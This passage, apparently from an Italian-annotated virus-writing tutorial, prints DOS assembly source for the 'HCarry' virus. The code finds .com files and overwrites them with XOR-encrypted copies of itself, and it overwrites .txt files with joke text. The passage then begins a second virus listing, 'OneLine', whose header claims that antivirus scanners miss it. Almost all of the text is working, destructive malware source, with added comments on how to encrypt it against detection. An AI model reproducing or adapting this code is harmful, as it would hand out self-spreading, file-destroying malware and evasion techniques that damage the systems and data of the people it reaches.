<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>lodsb<span style="mso-spacerun: yes">                       
</span>; carica un byte <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>xor al,byte ptr [xor_value]<span style="mso-spacerun: yes"> 
</span>; lo critta(o decritta)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>stosb<span style="mso-spacerun: yes">                       
</span>; salva il byte<span style="mso-spacerun: yes">                  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>loop crypt<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>crypt_start:<span style="mso-spacerun: yes">    </span>; qui
inizia la parte crittata del codice virus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,9<span style="mso-spacerun: yes">          
</span>;print string to screen<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>lea dx,textmask<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<span style="mso-spacerun: yes">           
</span>;go do it dos!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ax,0fa02<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>push<span style="mso-spacerun: yes">   </span>ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov bl,0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov<span style="mso-spacerun: yes">  </span>dx,05945<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>push<span style="mso-spacerun: yes">  </span>dx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 016<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>push cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,4eh<span style="mso-spacerun: yes">        
</span>;find first file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>lea dx,filemask<span style="mso-spacerun: yes">   
</span>;put the kind of file we want to find first in dx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>xor cx,cx<span style="mso-spacerun: yes">         
</span>;clears the cx register to 0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>find_next:<span style="mso-spacerun: yes">        
</span>;label for the find next rountine<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<span style="mso-spacerun: yes">           
</span>; go do it!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jnc infect<span style="mso-spacerun: yes">        
</span>;jump if a file is found, if not continue jnc=jump<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jmp text<span style="mso-spacerun: yes">          
</span>;if carry flag isn't set<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>infect:<span style="mso-spacerun: yes">           
</span>;here is our infect rountine, where we go when we find a file to kill<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ax,3d02h<span style="mso-spacerun: yes">      
</span>; open file for read/write access (00=read<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">                  
</span>;01=write 02=read/write)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov dx, 9eh<span style="mso-spacerun: yes">       
</span>;get file info<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<span style="mso-spacerun: yes">           
</span>;now!~<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov bx,ax<span style="mso-spacerun: yes">         
</span>;move info form bx register in ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; ricava e salva la chiave<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>in al,40h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>mov byte ptr [xor_value],al<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; scrive la parte non crittata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>mov ah,40h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>lea dx,start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>mov cx,crypt_start - start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; cripta il codice virus <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>lea si,crypt_start<span style="mso-spacerun: yes">       
</span>; indirizzo di inziio crittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>lea di,end<span style="mso-spacerun: yes">               
</span>; indirizzo di fine crittazione<span style="mso-spacerun: yes">    
</span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>mov cx,end - crypt_start<span style="mso-spacerun: yes"> 
</span>; in CX numero di bytes da crittare <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>call crypt<span style="mso-spacerun: yes">               
</span>; crittografazione codice<span style="mso-spacerun: yes">     </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; scrive la perte crittata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>mov ah,40h<span style="mso-spacerun: yes">          </span><span
style="mso-spacerun: yes">     </span>; 40h funzione di scrittura su file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>mov cx,end - crypt_start ; in Cxnumero
bytes da scrivere<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>lea dx,end<span style="mso-spacerun: yes">              
</span>; scrive da qui<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>int 21h<span style="mso-spacerun:
yes">                  </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,3eh<span style="mso-spacerun:
yes">               </span>;close the file up<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<span style="mso-spacerun:
yes">                  </span>;now!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,4fh<span style="mso-spacerun: yes">    </span><span
style="mso-spacerun: yes">           </span>;find next file!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jmp find_next<span style="mso-spacerun:
yes">            </span>;continue!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>text:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,4eh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>lea dx,textfile<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jnc text_pload<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jmp close<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>text_pload:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov<span style="mso-spacerun: yes">  </span>ax,3d02h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov<span style="mso-spacerun: yes">  </span>dx,9eh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int<span style="mso-spacerun: yes">  </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov<span style="mso-spacerun: yes">  </span>ah,40h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov<span style="mso-spacerun: yes"> 
</span>cx,pload_end - pload_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>lea<span style="mso-spacerun: yes"> 
</span>dx,pload_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int<span style="mso-spacerun: yes">  </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jmp text_findnext<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>text_findnext:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>mov ah,4fh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int<span style="mso-spacerun: yes">  </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jnc<span style="mso-spacerun: yes">  </span>text_pload<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>jmp close<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>pload_start:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'HOLY COW!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'>db '---',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Whats your favorite planet?...Mines the
SUN!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'One time i studied it for a whole hour i almost
went BLIND!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'>db '---',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Hey!....Whats goin.....Hey!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'>db '---',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Now just for some silly crap!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'FLOCK!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Hehehehe Look At YOU!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Back to the Computer Store for you!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'This is HORRRIBLE!'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Who would do something like this?',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'MY LEG DOESNT BEND THAT WAY!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'MOCB',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'This Virus has infected this file if you havnt
found that out yet!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Please insert 25 cents!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'DO DO DO Were Sorry your call did not go threw
please hang up and try again',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'JERRY JERRY JERRY JERRY JERRY JERRY',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>db 'Jerry Springer to HOT for Television',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:DE'>db 'DOH!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>pload_end:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>close:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>int 20h<span style="mso-spacerun: yes">           
</span>;exit program<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  </span><span
style="mso-spacerun: yes">                 </span>;this next portion is the
datasegment which the virus refers to for<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">                  
</span>;the variable we give it<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">                  
</span>;Thank you to Spo0ky,&lt;-OPIC-&gt;,and Arsonic for helping me!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        
</span>textfile db '*.txt',0<span style="mso-spacerun: yes">   </span>;find
.txt files<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        
</span>filemask db '*.com',0<span style="mso-spacerun: yes">   </span>;the
kinds of files we want<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        
</span>textmask db 'This file is now infected!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">                 
</span>db 'By The HCarry virus!',10,13,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">                 
</span>db 'MoCBDUKE[Codebreaker, 1998]',10,13,'$'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>end:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:red;mso-ansi-language:EN-US'>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<o:p></o:p></span></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<h1><a name="_3._Virus_Oneline:"></a><span lang=EN-US style='mso-fareast-font-family:
"MS Mincho";color:red'>3. Virus Oneline:<o:p></o:p></span></h1>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;
------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; --<span style="mso-spacerun:
yes">                    </span>The OneLine Virus<span style="mso-spacerun:
yes">                   </span>--<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; --<span style="mso-spacerun: yes">              
</span>By Arsonic[CodeBreakers]<span style="mso-spacerun: yes">   </span><span
style="mso-spacerun: yes">              </span>--<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; --<span style="mso-spacerun: yes">         
</span>HTTP://CODEBREAKERS.SIMPLENET.COM<span style="mso-spacerun:
yes">             </span>--<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;
------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; Virus Info: This Virus is a 600 byte Long Encrypted
Overwriting piece of<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; shit. it will infect all *.com file in the current
directory and overwrite<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; the first line of all text files found with Famous
Lines And Stuff..<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; Detected By:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; TBAV:<span style="mso-spacerun: yes">  </span>Says
This is a Unknown Virus.. But Only on the First Generation.. :)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; FPROT: ??? did'n have it on my computer at the time
of scanning.. <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>; AVP:<span style="mso-spacerun: yes">   </span>Nope..
Detected 3000 other virus's i got on my comp.. but not this one..<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>jmp crypt_start<span style="mso-spacerun: yes">   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>; parte non criptata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

